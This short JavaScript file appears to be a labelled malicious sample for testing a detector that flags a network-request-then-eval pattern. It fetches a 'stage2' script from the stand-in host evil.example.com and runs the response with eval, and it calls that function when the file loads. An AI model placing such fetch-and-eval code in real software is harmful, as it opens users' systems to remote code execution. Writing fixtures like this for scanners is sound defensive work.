// Malicious: fetch remote resource and eval the response body
// Pattern: NetworkRequest → Eval (RemoteCodeExecution signal)
const https = require('https');

function fetchAndEval(url) {
    https.get(url, function(res) {
        let body = '';
        res.on('data', function(chunk) { body += chunk; });
        res.on('end', function() {
            eval(body);
        });
    });
}

fetchAndEval('https://evil.example.com/stage2.js');
